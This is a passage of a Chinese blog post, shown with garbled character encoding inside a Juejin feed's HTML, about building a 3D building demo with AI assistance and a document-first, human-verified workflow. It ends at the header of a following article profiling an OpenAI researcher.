<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a503b8c150bf459491eaaa95066a697a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=omb0slg7hO%2F6AROjlP5lpgo12u4%3D" alt="image.png" loading="lazy"/></p>
<p>ä»è®°å½•ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘å¹¶æœªé‡‡ç”¨â€œè¾¹å†™ä»£ç è¾¹è¯•é”™â€çš„æ–¹å¼ï¼Œè€Œæ˜¯<strong>ä¸¥æ ¼éµå¾ªã€Œæ–‡æ¡£å…ˆè¡Œã€çš„åŸåˆ™</strong>æ¥æ¨è¿›æ•´ä¸ªé¡¹ç›®ã€‚å…·ä½“æµç¨‹å¯ä»¥æŠ½è±¡ä¸ºä¸€æ¡ç›¸å¯¹é€šç”¨çš„å®è·µé“¾è·¯ï¼š</p>
<blockquote>
<p>â€œAIÂ åˆ†æéœ€æ±‚â€Â -&gt;Â â€œç”ŸæˆæŠ€æœ¯æ–¹æ¡ˆä¸å®ç°è·¯å¾„â€Â -&gt;Â â€œé¡µé¢ä¸äº¤äº’è®¾è®¡â€Â -&gt;Â â€œé¡¹ç›®åˆå§‹åŒ–â€Â -&gt;Â â€œæŒ‰æ­¥éª¤åˆ†é˜¶æ®µå®ç°åŠŸèƒ½â€Â -&gt;Â â€œæµ‹è¯•ä¸é—®é¢˜ä¿®å¤â€Â -&gt;Â â€œä¼˜åŒ–ä¸å®Œå–„â€</p>
</blockquote>
<p>åœ¨è¿™ä¸€è¿‡ç¨‹ä¸­ï¼ŒAIÂ æ‰¿æ‹…äº†ä»éœ€æ±‚åˆ†æã€æ–¹æ¡ˆè®¾è®¡åˆ°å…·ä½“å®ç°çš„ä¸»è¦è¾“å‡ºå·¥ä½œï¼›è€Œæˆ‘æ›´å¤šæ‰®æ¼”çš„æ˜¯<strong>éœ€æ±‚æ ¡éªŒè€…ä¸æ–¹å‘å†³ç­–è€…</strong>çš„è§’è‰²ï¼ŒæŒç»­åˆ¤æ–­Â AIÂ ç»™å‡ºçš„æ–¹æ¡ˆæ˜¯å¦ç¬¦åˆé¢„æœŸï¼Œå¹¶åœ¨å¿…è¦æ—¶è¿›è¡Œè°ƒæ•´ä¸æ”¶æ•›ã€‚</p>
<p>è¿™ç§æ¨¡å¼ä½¿æˆ‘èƒ½å¤Ÿåœ¨ä¸ç†Ÿæ‚‰Â 3DÂ æŠ€æœ¯ç»†èŠ‚çš„å‰æä¸‹ï¼Œä¾ç„¶ä¿æŒå¯¹æ•´ä½“æ¶æ„å’Œäº§å“å½¢æ€çš„æ§åˆ¶ï¼Œä»è€Œé¡ºåˆ©å®Œæˆä¸€æ¬¡ä»Â 0Â åˆ°Â 1Â çš„å®Œæ•´å®è·µã€‚</p>
<h5 data-id="heading-27">2.2.2ã€æµç¨‹è§£æ</h5>
<p>ä¸ºäº†æ›´æ¸…æ™°åœ°è¯´æ˜è¿™ä¸€å®è·µè¿‡ç¨‹ï¼Œæˆ‘å°†ä¸Šè¿°é“¾è·¯è¿›ä¸€æ­¥æ‹†è§£ä¸ºä»¥ä¸‹äº”ä¸ªé˜¶æ®µï¼š</p>
<p><strong>1ï¼‰æ–‡æ¡£ä¸Â UIÂ è®¾è®¡é˜¶æ®µ</strong></p>
<p>åœ¨çœŸæ­£è¿›å…¥å®ç°ä¹‹å‰ï¼Œæˆ‘é¦–å…ˆå°†è‡ªå·±çš„æƒ³æ³•ã€ç›®æ ‡ä¸é¢„æœŸæ•ˆæœå®Œæ•´åœ°äº¤ç»™Â AIï¼Œç”±å…¶è¿›è¡Œéœ€æ±‚åˆ†æå¹¶äº§å‡ºåˆæ­¥çš„æŠ€æœ¯æ–¹æ¡ˆä¸å®ç°æ€è·¯ã€‚</p>
<p>éœ€è¦å¼ºè°ƒçš„æ˜¯ï¼Œè¿™ä¸€é˜¶æ®µ<strong>å¹¶ä¸æ˜¯â€œå®Œå…¨æ”¾æ‰‹â€</strong>ï¼Œè€Œæ˜¯éœ€è¦æˆ‘ä»¬æ·±åº¦å‚ä¸å’ŒæŒç»­æ ¡éªŒï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>æ˜¯å¦ç¬¦åˆæœ€åˆè®¾å®šçš„ç›®æ ‡è¾¹ç•Œï¼›</li>
<li>æŠ€æœ¯æ–¹æ¡ˆæ˜¯å¦è¿‡åº¦è®¾è®¡ï¼›</li>
<li>UIÂ ä¸äº¤äº’æ˜¯å¦å…·å¤‡å®é™…å¯è¡Œæ€§ã€‚</li>
</ul>
<p>è¿™ä¸€è¿‡ç¨‹æœ¬è´¨ä¸Šæ˜¯<strong>å°†æ¨¡ç³Šæƒ³æ³•ä¸æ–­ç»“æ„åŒ–ã€å…·ä½“åŒ–</strong>çš„è¿‡ç¨‹ã€‚</p>
<blockquote>
<p>ğŸ’¡Tipsï¼šè¯¥é˜¶æ®µæ˜¯æ•´ä¸ªè®¾è®¡ä¸­æœ€ä¸ºé‡è¦çš„ä¸€ç¯ï¼Œå®ƒå½±å“ç€æˆ‘ä»¬çš„æ•´ä½“è®¾è®¡é“¾è·¯ã€‚</p>
</blockquote>
<p><strong>2ï¼‰é¡¹ç›®åˆå§‹åŒ–</strong></p>
<p>åœ¨é¡¹ç›®åˆå§‹åŒ–é˜¶æ®µï¼ŒAIÂ æ›´å¤šåœ°æ‰¿æ‹…äº†â€œæŠ€æœ¯è´Ÿè´£äººâ€çš„è§’è‰²ï¼Œè´Ÿè´£æ•´ä½“å·¥ç¨‹éª¨æ¶çš„æ­å»ºï¼ŒåŒ…æ‹¬ä½†ä¸é™äºï¼š</p>
<ul>
<li>3DÂ åœºæ™¯åˆå§‹åŒ–é€»è¾‘ï¼›</li>
<li>æ¸²æŸ“å¾ªç¯ä¸åŸºç¡€æ›´æ–°æœºåˆ¶ï¼›</li>
<li>æ¨¡å—ä¸èµ„æºçš„ç»„ç»‡æ–¹å¼ã€‚</li>
</ul>
<p>è¿™ä¸€é˜¶æ®µçš„æ ¸å¿ƒä»·å€¼åœ¨äºï¼š<strong>å¿«é€Ÿå»ºç«‹ä¸€ä¸ªå¯æŒç»­è¿­ä»£çš„å·¥ç¨‹åŸºç¡€</strong>ï¼Œè€Œä¸æ˜¯ä¸€å¼€å§‹å°±è¿½æ±‚å®Œæ•´åŠŸèƒ½ã€‚</p>
<p><strong>3ï¼‰æ ¸å¿ƒÂ 3DÂ åœºæ™¯æ­å»º</strong></p>
<p>åœ¨å…·å¤‡åŸºç¡€å·¥ç¨‹ç»“æ„åï¼Œå®è·µè¿›å…¥åˆ°Â 3DÂ åœºæ™¯æœ¬èº«çš„æ„å»ºé˜¶æ®µã€‚AIÂ é’ˆå¯¹Â 3DÂ åœºæ™¯ä¸­è¾ƒä¸ºå…³é”®çš„åŸºç¡€èƒ½åŠ›æä¾›äº†è¾ƒä¸ºç³»ç»Ÿçš„æŒ‡å¯¼ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>ç›¸æœºï¼ˆ<code>Camera</code>ï¼‰çš„ç±»å‹é€‰æ‹©ä¸å‚æ•°é…ç½®ï¼›</li>
<li>å…‰æºï¼ˆ<code>Light</code>ï¼‰çš„ç»„åˆæ–¹å¼ä¸åŸºç¡€ç…§æ˜ç­–ç•¥ï¼›</li>
<li>æ§åˆ¶å™¨ï¼ˆ<code>Controls</code>ï¼‰çš„ä½¿ç”¨åœºæ™¯ä¸äº¤äº’é™åˆ¶ã€‚</li>
</ul>
<p>å€ŸåŠ©è¿™äº›æŒ‡å¯¼ï¼Œæˆ‘èƒ½å¤Ÿåœ¨ä¸æ·±å…¥å›¾å½¢å­¦åŸç†çš„å‰æä¸‹ï¼Œå¿«é€Ÿæ­å»ºå‡ºä¸€ä¸ª<strong>å¯è§‚å¯Ÿã€å¯æ“ä½œã€ç»“æ„æ¸…æ™°</strong>çš„ä¸‰ç»´ç©ºé—´ç¯å¢ƒã€‚</p>
<p><strong>4ï¼‰äº¤äº’èƒ½åŠ›è¡¥é½</strong></p>
<p>åœ¨å®ŒæˆåŸºç¡€å±•ç¤ºåï¼Œé‡ç‚¹å¼€å§‹è½¬å‘äº¤äº’èƒ½åŠ›çš„è¡¥é½ã€‚AIÂ åœ¨è¿™ä¸€é˜¶æ®µååŠ©æˆ‘é€æ­¥å¼•å…¥å¹¶å®Œå–„äº†ä»¥ä¸‹å…³é”®èƒ½åŠ›ï¼š</p>
<ul>
<li>åŸºäºÂ <strong>Raycasting</strong>Â çš„ç‚¹å‡»ä¸å‘½ä¸­æ£€æµ‹ï¼›</li>
<li>åŸºäºÂ <strong>HTMLÂ Overlay</strong>Â çš„åŒºåŸŸæ ‡ç­¾å±•ç¤ºç­–ç•¥ä¸ä½ç½®è®¡ç®—ï¼›</li>
<li>åŒºåŸŸæ‚¬åœé«˜äº®æ•ˆæœï¼ˆçº¿æ¡†è½®å»“ï¼‰ï¼›</li>
<li>æ¥¼å±‚ä¸åŒºåŸŸä¹‹é—´çš„å±‚çº§å…³ç³»ç®¡ç†ï¼›</li>
<li>æ¥¼å±‚åˆ‡æ¢ã€æ˜¾ç¤ºæ§åˆ¶åŠçŠ¶æ€åŒæ­¥é€»è¾‘ã€‚</li>
</ul>
<p>éšç€è¿™äº›èƒ½åŠ›é€æ­¥è½åœ°ï¼Œæ•´ä¸ªÂ DemoÂ ä¹Ÿä»â€œé™æ€æ¨¡å‹å±•ç¤ºâ€æ¼”è¿›ä¸ºä¸€ä¸ª<strong>å¯æ¢ç´¢ã€å¯äº¤äº’çš„Â 3DÂ å»ºç­‘åœºæ™¯</strong>ã€‚</p>
<p><strong>5ï¼‰ä¼˜åŒ–å®Œå–„</strong></p>
<p>åœ¨åŠŸèƒ½åŸºæœ¬æˆå‹åï¼Œæœ€åä¸€ä¸ªé˜¶æ®µèšç„¦äºä½“éªŒä¸ç¨³å®šæ€§çš„ä¼˜åŒ–ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>æ€§èƒ½ä¸æ¸²æŸ“æ•ˆæœçš„åŸºç¡€ä¼˜åŒ–ï¼›</li>
<li>äº¤äº’åé¦ˆä¸è§†è§‰è¡¨ç°çš„è°ƒæ•´ï¼›</li>
<li>é—®é¢˜ä¿®å¤ä¸é€»è¾‘æ”¶æ•›ã€‚</li>
</ul>
<p>è¿™ä¸€é˜¶æ®µè™½ç„¶ä¸å†å¼•å…¥æ–°çš„æ ¸å¿ƒèƒ½åŠ›ï¼Œä½†å¯¹äºÂ DemoÂ çš„â€œå¯ç”¨æ€§â€å’Œå®Œæ•´åº¦èµ·åˆ°äº†å†³å®šæ€§ä½œç”¨ã€‚</p>
<h4 data-id="heading-28">2.3ã€æœ€ç»ˆæ”¶è·</h4>
<p>å›é¡¾æ•´ä¸ªè¿‡ç¨‹ï¼Œè¿™æ¬¡å®è·µæ›´åƒæ˜¯ä¸€åœº<strong>æ–¹æ³•è®ºéªŒè¯</strong>ï¼š</p>
<blockquote>
<p>åœ¨Â AIÂ çš„æŒç»­è¾…åŠ©ä¸‹ï¼Œé€šè¿‡ã€Œæ–‡æ¡£é©±åŠ¨Â +Â å°æ­¥è¿­ä»£Â +Â äººå·¥æ ¡éªŒã€çš„æ–¹å¼ï¼Œå³ä½¿é¢å¯¹é™Œç”Ÿé¢†åŸŸï¼Œä¹Ÿèƒ½å¤Ÿåœ¨è¾ƒçŸ­æ—¶é—´å†…å®Œæˆä¸€æ¬¡å¯è½åœ°çš„æŠ€æœ¯æ¢ç´¢ã€‚</p>
</blockquote>
<p>å…·ä½“æ¥çœ‹ï¼Œè¿™æ¬¡å®è·µå¸¦æ¥çš„æ”¶è·ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š</p>
<h5 data-id="heading-29">2.3.1ã€å¯¹Â AIÂ èƒ½åŠ›è¾¹ç•Œçš„æ›´æ¸…æ™°è®¤çŸ¥</h5>
<p>åœ¨å®è·µä¹‹å‰ï¼Œæˆ‘æ›´å¤šæ˜¯å°†Â AIÂ è§†ä¸ºâ€œé—®é¢˜è§£ç­”å·¥å…·â€æˆ–â€œä»£ç è¡¥å…¨åŠ©æ‰‹â€ï¼›è€Œåœ¨è¿™æ¬¡å®Œæ•´é¡¹ç›®è¿‡ç¨‹ä¸­ï¼ŒAIÂ æ›´åƒæ˜¯ä¸€ä¸ª<strong>éšæ—¶å¯è°ƒç”¨çš„æŠ€æœ¯åˆä½œè€…</strong>ï¼Œèƒ½å¤Ÿåœ¨éœ€æ±‚åˆ†æã€æ–¹æ¡ˆæ‹†è§£ã€æŠ€æœ¯é€‰å‹ä»¥åŠå…·ä½“å®ç°ä¸Šæä¾›æŒç»­æ”¯æŒã€‚</p>
<p>åŒæ—¶ï¼Œè¿™æ¬¡å®è·µä¹Ÿè®©æˆ‘æ›´æ¸…æ™°åœ°è®¤è¯†åˆ°Â AIÂ çš„è¾¹ç•Œï¼šAIÂ å¹¶ä¸èƒ½æ›¿ä»£äººçš„åˆ¤æ–­ä¸å†³ç­–ï¼Œä½†<strong>å¯ä»¥æ˜¾è‘—é™ä½è¯•é”™æˆæœ¬å’Œèµ·æ­¥é—¨æ§›</strong>ï¼Œå°¤å…¶åœ¨è·¨é¢†åŸŸæ¢ç´¢ä¸­ä»·å€¼å°¤ä¸ºæ˜æ˜¾ã€‚</p>
<h5 data-id="heading-30">2.3.2ã€éªŒè¯äº†ä¸€ç§å¯å¤ç”¨çš„è·¨é¢†åŸŸå®è·µè·¯å¾„</h5>
<p>é€šè¿‡è¿™æ¬¡å®è·µï¼Œæˆ‘éªŒè¯äº†ä¸€æ¡åœ¨é™Œç”Ÿé¢†åŸŸä¸­è¡Œä¹‹æœ‰æ•ˆçš„é€šç”¨è·¯å¾„ï¼š</p>
<ul>
<li>å…ˆæ˜ç¡®ç›®æ ‡ä¸è¾¹ç•Œï¼Œè€Œéè¿½æ±‚ä¸€æ¬¡æ€§â€œåšå¤§åšå…¨â€ï¼›</li>
<li>ä»¥æ–‡æ¡£å’Œæ–¹æ¡ˆä¸ºå…ˆå¯¼ï¼Œé™ä½ç›´æ¥ç¼–ç å¸¦æ¥çš„ä¸ç¡®å®šæ€§ï¼›</li>
<li>å°†å¤æ‚é—®é¢˜æ‹†è§£ä¸ºå¤šä¸ªå¯éªŒè¯çš„å°æ­¥éª¤ï¼›</li>
<li>åœ¨æ¯ä¸€æ­¥ç”±äººæ¥åšæœ€ç»ˆåˆ¤æ–­ä¸æ”¶æ•›ã€‚</li>
</ul>
<p>è¿™ä¸€æ¨¡å¼å¹¶ä¸ä¾èµ–å…·ä½“æŠ€æœ¯æ ˆï¼Œå¯¹åç»­æ¢ç´¢å…¶ä»–æŠ€æœ¯æ–¹å‘åŒæ ·å…·å¤‡å‚è€ƒä»·å€¼ã€‚</p>
<h5 data-id="heading-31">2.3.3ã€å¯¹â€œå­¦ä¹ æˆæœ¬â€çš„è®¤çŸ¥å‘ç”Ÿè½¬å˜</h5>
<p>è¿‡å»åœ¨é¢å¯¹ä¸ç†Ÿæ‚‰é¢†åŸŸæ—¶ï¼Œå¾€å¾€ä¼šè¢«â€œéœ€è¦è¡¥é½å¤§é‡å‰ç½®çŸ¥è¯†â€æ‰€åŠé€€ï¼›è€Œè¿™æ¬¡å®è·µè®©æˆ‘æ„è¯†åˆ°ï¼Œåœ¨Â AIÂ çš„è¾…åŠ©ä¸‹ï¼Œ<strong>å­¦ä¹ ä¸å¿…ç­‰åˆ°å®Œå…¨ç†è§£æ‰€æœ‰åŸç†ä¹‹åæ‰å¼€å§‹åŠ¨æ‰‹</strong>ã€‚</p>
<p>é€šè¿‡â€œå…ˆåšå‡ºæ¥ï¼Œå†é€æ­¥ç†è§£â€çš„æ–¹å¼ï¼Œå¯ä»¥åœ¨å®è·µä¸­åå‘è¡¥é½è®¤çŸ¥ï¼Œè¿™åœ¨æ•ˆç‡å’Œå¿ƒç†è´Ÿæ‹…ä¸Šéƒ½æ›´å¯æ§ã€‚</p>
<h5 data-id="heading-32">2.3.4ã€ä»â€œæ˜¯å¦èƒ½åšåˆ°â€åˆ°â€œæ˜¯å¦å€¼å¾—å»åšâ€</h5>
<p>æœ€ç»ˆå®Œæˆçš„Â DemoÂ æœ¬èº«å¹¶ä¸å¤æ‚ï¼Œä½†å®ƒèµ·åˆ°çš„å…³é”®ä½œç”¨åœ¨äºï¼šå®ƒè®©æˆ‘ä»â€œæˆ‘èƒ½ä¸èƒ½åšÂ 3DÂ ç›¸å…³çš„ä¸œè¥¿â€ï¼Œè½¬å˜ä¸ºâ€œåœ¨ä»€ä¹ˆåœºæ™¯ä¸‹ï¼Œè¿™ç±»æŠ€æœ¯å€¼å¾—è¢«å¼•å…¥å’Œä½¿ç”¨â€ã€‚</p>
<p>è¿™ç§è§†è§’çš„è½¬å˜ï¼Œæ¯”å•çº¯æŒæ¡æŸä¸ªå…·ä½“æŠ€æœ¯ç‚¹æ›´æœ‰ä»·å€¼ã€‚</p>
<h3 data-id="heading-33">ä¸‰ã€AIè¾…åŠ©ç ”å‘çš„æ–¹æ³•è®ºæ€»ç»“</h3>
<p>ç»¼åˆå‰æ–‡çš„å®è·µè¿‡ç¨‹ä¸ç»“æœï¼Œè¿™æ¬¡Â 3DÂ å»ºç­‘Â DemoÂ çš„æ¢ç´¢ï¼Œæœ¬è´¨ä¸Šå¹¶ä¸æ˜¯ä¸€æ¬¡å•ç‚¹æŠ€æœ¯å°è¯•ï¼Œè€Œæ˜¯ä¸€æ¬¡å¯¹Â <strong>AIÂ è¾…åŠ©ç ”å‘æ–¹æ³•è®º</strong>çš„ç³»ç»ŸéªŒè¯ã€‚</p>
<p>åœ¨å®é™…åº”ç”¨ä¸­ï¼Œæˆ‘é€æ­¥æ€»ç»“å‡ºä¸€å¥—ç›¸å¯¹ç¨³å®šã€å¯å¤ç”¨çš„åä½œæ¨¡å¼ã€‚</p>
<h4 data-id="heading-34">3.1ã€è®©Â AIÂ åšç»“æ„æ€§å·¥ä½œ</h4>
<p>åœ¨é¡¹ç›®åˆæœŸï¼Œ<strong>ç»“æ„æ€§å·¥ä½œæ˜¯æœ€é€‚åˆäº¤ç»™Â AIÂ çš„éƒ¨åˆ†</strong>ã€‚è¿™ç±»å·¥ä½œé€šå¸¸å…·å¤‡ä»¥ä¸‹ç‰¹å¾ï¼š</p>
<ul>
<li>ä¿¡æ¯é‡å¤§ï¼Œä½†å•ç‚¹å†³ç­–æˆæœ¬ä¸é«˜ï¼›</li>
<li>éœ€è¦æ•´ä½“è§†è§’ï¼Œè€Œéå±€éƒ¨å®ç°ç»†èŠ‚ï¼›</li>
<li>å®¹æ˜“å› ä¸ºç»éªŒä¸è¶³è€Œèµ°å¼¯è·¯ã€‚</li>
</ul>
<p>å…·ä½“åŒ…æ‹¬ä½†ä¸é™äºï¼š</p>
<ul>
<li>éœ€æ±‚æ‹†è§£ä¸åŠŸèƒ½æ¨¡å—åˆ’åˆ†ï¼›</li>
<li>æŠ€æœ¯æ–¹æ¡ˆä¸å®ç°è·¯å¾„è®¾è®¡ï¼›</li>
<li>é¡¹ç›®ç›®å½•ç»“æ„ä¸å·¥ç¨‹éª¨æ¶è§„åˆ’ï¼›</li>
<li>ä¸åŒæ–¹æ¡ˆä¹‹é—´çš„ä¼˜åŠ£å¯¹æ¯”ï¼›</li>
</ul>
<p>AIÂ åœ¨è¿™ä¸€é˜¶æ®µçš„ä»·å€¼ï¼Œå¹¶ä¸åœ¨äºâ€œä¸€å®šç»™å‡ºæœ€ä¼˜è§£â€ï¼Œè€Œåœ¨äº<strong>å¿«é€Ÿæ„å»ºä¸€ä¸ªå®Œæ•´ä¸”å¯è®¨è®ºçš„ç»“æ„</strong>ï¼Œè®©ç ”å‘èƒ½å¤Ÿå°½æ—©è¿›å…¥â€œåˆ¤æ–­ä¸ä¿®æ­£â€é˜¶æ®µï¼Œè€Œä¸æ˜¯é•¿æœŸåœç•™åœ¨ç©ºæƒ³ä¸­ã€‚</p>
<h4 data-id="heading-35">3.2ã€è®©Â AIÂ åšé‡å¤æ€§ä¸æœºæ¢°æ€§å·¥ä½œ</h4>
<p>åœ¨è¿›å…¥å…·ä½“å®ç°åï¼ŒAIÂ éå¸¸é€‚åˆæ‰¿æ‹…<strong>é‡å¤æ€§å¼ºã€æ¨¡å¼ç›¸å¯¹å›ºå®šçš„å·¥ä½œ</strong>ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>æ¨¡æ¿ä»£ç ã€åŸºç¡€é…ç½®ä¸æ ·æ¿é€»è¾‘ç”Ÿæˆï¼›</li>
<li>APIÂ ä½¿ç”¨ç¤ºä¾‹ã€è°ƒç”¨æ–¹å¼æ¢³ç†ï¼›</li>
<li>å·²çŸ¥æ–¹æ¡ˆçš„å®ç°è½åœ°ï¼›</li>
<li>æ–‡æ¡£è¡¥å…¨ã€æ­¥éª¤æ•´ç†ä¸è¯´æ˜ç¼–å†™ã€‚</li>
</ul>
<p>è¿™äº›å·¥ä½œæœ¬èº«å¹¶ä¸ä½“ç°ç ”å‘çš„æ ¸å¿ƒä»·å€¼ï¼Œä½†å´å¤§é‡æ¶ˆè€—æ—¶é—´ä¸ç²¾åŠ›ã€‚<br/>
å°†å®ƒä»¬äº¤ç”±Â AIÂ å®Œæˆï¼Œå¯ä»¥æ˜¾è‘—æå‡æ¨è¿›æ•ˆç‡ï¼Œä½¿äººèƒ½å¤ŸæŠŠæ³¨æ„åŠ›é›†ä¸­åœ¨<strong>çœŸæ­£éœ€è¦æ€è€ƒå’Œåˆ¤æ–­çš„éƒ¨åˆ†</strong>ã€‚</p>
<h4 data-id="heading-36">3.3ã€ä½ è´Ÿè´£åˆ¤æ–­ä¸ä¼˜åŒ–ï¼ˆæ–¹å‘æŠŠæ§ï¼‰</h4>
<p>æ— è®ºÂ AIÂ åœ¨è¾“å‡ºå±‚é¢å¤šä¹ˆé«˜æ•ˆï¼Œ<strong>æ–¹å‘åˆ¤æ–­ä¸è´¨é‡æŠŠæ§å§‹ç»ˆå¿…é¡»ç”±äººæ¥å®Œæˆ</strong>ã€‚<br/>
åœ¨å®è·µè¿‡ç¨‹ä¸­ï¼Œæˆ‘æ‰¿æ‹…çš„æ ¸å¿ƒèŒè´£ä¸»è¦é›†ä¸­åœ¨ä¸‰ç‚¹ï¼š</p>
<ul>
<li>åˆ¤æ–­Â AIÂ ç»™å‡ºçš„æ–¹æ¡ˆæ˜¯å¦ç¬¦åˆçœŸå®éœ€æ±‚ï¼›</li>
<li>è¯†åˆ«æ˜¯å¦å­˜åœ¨è¿‡åº¦è®¾è®¡æˆ–æŠ€æœ¯å†—ä½™ï¼›</li>
<li>åœ¨å¤šç§å¯è¡Œè·¯å¾„ä¸­åšå–èˆä¸æ”¶æ•›ã€‚</li>
</ul>
<p>æ¢å¥è¯è¯´ï¼ŒAIÂ è´Ÿè´£â€œç»™å¯èƒ½æ€§â€ï¼Œè€Œäººè´Ÿè´£â€œåšé€‰æ‹©â€ã€‚<br/>
ä¸€æ—¦è¿™ä¸€è§’è‰²åˆ†å·¥å‘ç”Ÿé”™ä½ï¼ŒAIÂ è¾…åŠ©ç ”å‘å°±å¾ˆå®¹æ˜“æ¼”å˜ä¸ºâ€œæ— æ§åˆ¶çš„å †ç Œâ€ï¼Œåè€Œå¢åŠ å¤æ‚åº¦ã€‚</p>
<h4 data-id="heading-37">3.4ã€æ¶‰åŠæœªçŸ¥é¢†åŸŸæ—¶</h4>
<p>åœ¨é¢å¯¹é™Œç”Ÿæˆ–è·¨é¢†åŸŸæŠ€æœ¯æ—¶ï¼ŒAIÂ çš„ä½¿ç”¨æ–¹å¼éœ€è¦è¿›ä¸€æ­¥è°ƒæ•´ã€‚ç»“åˆæœ¬æ¬¡å®è·µï¼Œæˆ‘æ€»ç»“å‡ºå‡ ç‚¹å°¤ä¸ºé‡è¦çš„ç»éªŒï¼š</p>
<ul>
<li><strong>å…ˆè§£å†³â€œèƒ½ä¸èƒ½è·‘èµ·æ¥â€ï¼Œå†è¿½æ±‚â€œæ˜¯å¦è¶³å¤Ÿä¼˜é›…â€</strong>ï¼›</li>
<li>ä¸å¿…ä¸€å¼€å§‹å°±è¡¥é½æ‰€æœ‰ç†è®ºçŸ¥è¯†ï¼Œè€Œæ˜¯åœ¨å®è·µä¸­åå‘å­¦ä¹ ï¼›</li>
<li>å°†ç›®æ ‡æ‹†è§£ä¸ºå¤šä¸ªâ€œå¯éªŒè¯çš„å°æˆæœâ€ï¼Œè€Œä¸æ˜¯ä¸€æ¬¡æ€§å®Œæˆï¼›</li>
<li>å¯¹Â AIÂ è¾“å‡ºä¿æŒâ€œå‚è€ƒè€Œéæƒå¨â€çš„å¿ƒæ€ã€‚</li>
</ul>
<p>è¿™ç§ç­–ç•¥çš„æ ¸å¿ƒï¼Œåœ¨äº<strong>é™ä½è¿›å…¥é—¨æ§›ä¸å¿ƒç†è´Ÿæ‹…</strong>ã€‚<br/>
AIÂ å¹¶ä¸æ˜¯è®©äººâ€œè·³è¿‡å­¦ä¹ â€ï¼Œè€Œæ˜¯è®©å­¦ä¹ è·¯å¾„ä»â€œå…ˆç†è§£å®Œå†åŠ¨æ‰‹â€ï¼Œè½¬å˜ä¸ºâ€œåœ¨åŠ¨æ‰‹ä¸­é€æ­¥ç†è§£â€ã€‚</p>
<h3 data-id="heading-38">å››ã€ç»“è¯­</h3>
<p>ä»æ•´ä½“æ¥çœ‹ï¼ŒAIÂ è¾…åŠ©ç ”å‘å¹¶ä¸æ˜¯ç®€å•çš„â€œç”¨Â AIÂ å†™ä»£ç â€ï¼Œè€Œæ˜¯ä¸€ç§<strong>åˆ†å·¥æ˜ç¡®ã€è´£ä»»æ¸…æ™°çš„äººæœºåä½œæ¨¡å¼</strong>ï¼š</p>
<ul>
<li>AIÂ æ“…é•¿å‘æ•£ã€æ•´ç†ã€ç”Ÿæˆï¼›</li>
<li>äººç±»æ“…é•¿åˆ¤æ–­ã€å–èˆã€æ”¶æ•›ï¼›</li>
</ul>
<p>å½“äºŒè€…è¾¹ç•Œæ¸…æ™°ã€èŒè´£æ˜ç¡®æ—¶ï¼ŒAIÂ æ‰èƒ½çœŸæ­£æˆä¸ºç ”å‘æ•ˆç‡çš„æ”¾å¤§å™¨ï¼Œè€Œä¸æ˜¯æ–°çš„å¤æ‚åº¦æ¥æºã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¿å®¶ç¿Œï¼šä»å¼€æºå°‘å¹´åˆ° OpenAI æ ¸å¿ƒç ”ç©¶å‘˜çš„é•¿æœŸä¸»ä¹‰ä¹‹è·¯]]></title>    <link>https://juejin.cn/post/7596955804260286514</link>    <guid>https://juejin.cn/post/7596955804260286514</guid>    <pubDate>2026-01-20T01:54:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596955804260286514" data-draft-id="7596955804260270130" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¿å®¶ç¿Œï¼šä»å¼€æºå°‘å¹´åˆ° OpenAI æ ¸å¿ƒç ”ç©¶å‘˜çš„é•¿æœŸä¸»ä¹‰ä¹‹è·¯"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-20T01:54:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="akå•Š"/> <meta itemprop="url" content="https://juejin.cn/user/237916932030253"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¿å®¶ç¿Œï¼šä»å¼€æºå°‘å¹´åˆ° OpenAI æ ¸å¿ƒç ”ç©¶å‘˜çš„é•¿æœŸä¸»ä¹‰ä¹‹è·¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/237916932030253/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    akå•Š
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:54:37.000Z" title="Tue Jan 20 2026 01:54:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
